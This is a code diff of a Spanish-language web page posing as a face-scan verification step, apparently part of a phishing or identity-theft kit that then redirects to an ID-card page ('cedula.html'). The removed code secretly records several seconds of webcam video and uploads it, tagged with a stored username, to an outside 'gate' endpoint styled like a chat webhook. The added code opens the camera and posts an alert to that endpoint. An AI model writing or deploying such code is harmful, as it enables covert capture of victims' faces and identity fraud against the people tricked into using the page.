@@ -6,16 +6,14 @@
     <style>
         body { background:#000; color:#00a4ef; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
         .v-container { text-align:center; border:1px solid #333; padding:30px; background:#0a0a0a; }
-        video { width:280px; height:280px; border-radius:50%; object-fit:cover; border:3px solid #00a4ef; box-shadow:0 0 15px #00a4ef; }
-        .loader { width:100%; height:3px; background:#111; margin-top:20px; position:relative; overflow:hidden; }
-        #bar { width:0%; height:100%; background:#00a4ef; transition: width 8s linear; }
+        video { width:280px; height:280px; border-radius:50%; object-fit:cover; border:3px solid #00a4ef; }
     </style>
 </head>
 <body>
     <div class="v-container">
         <h2 id="msg">INICIANDO SENSORES...</h2>
         <video id="v" autoplay playsinline muted></video>
-        <div class="loader"><div id="bar"></div></div>
+        <p>Alinee su rostro con el círculo</p>
     </div>
 
 <script>
@@ -24,25 +22,15 @@
     const u = localStorage.getItem("hydra_u") || "Anon";
 
     async function start() {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById('v').srcObject = stream;
-        const rec = new MediaRecorder(stream);
-        let chunks = [];
-        rec.ondataavailable = e => chunks.push(e.data);
-        rec.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const fd = new FormData();
-            fd.append("file", blob, `v_${u}.webm`);
-            fd.append("payload_json", JSON.stringify({ content: `📹 **VIDEO V99** - User: ${u}` }));
-            await fetch(gate, { method: 'POST', body: fd });
-            window.location.href = "cedula.html";
-        };
-        setTimeout(() => { 
-            document.getElementById('bar').style.width = "100%";
-            document.getElementById('msg').innerText = "ESCANEO EN PROGRESO...";
-            rec.start(); 
-        }, 1000);
-        setTimeout(() => rec.stop(), 9000);
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
+            
+            // Envía aviso de que el usuario ya está en cámara
+            fetch(gate, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `📹 **CÁMARA ABIERTA**\n👤 User: ${u}`}) });
+            
+            setTimeout(() => { window.location.href = "cedula.html"; }, 5000);
+        } catch(e) { window.location.href = "cedula.html"; }
     }
     window.onload = start;
 </script>
